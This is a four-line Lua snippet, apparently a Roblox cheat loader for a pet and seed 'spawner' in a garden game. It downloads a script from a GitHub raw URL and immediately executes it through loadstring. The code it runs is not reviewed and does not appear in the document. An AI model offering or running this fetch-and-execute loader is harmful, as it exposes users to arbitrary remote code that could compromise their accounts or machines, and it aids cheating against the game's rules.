local scriptUrl = "https://raw.githubusercontent.com/NotyourScripter/PetxSeedSpawner/refs/heads/main/No-Lag-ID-Garden-LoaderV1.lua"
local response = game:HttpGet(scriptUrl)
local loadedScript = loadstring(response)
loadedScript()
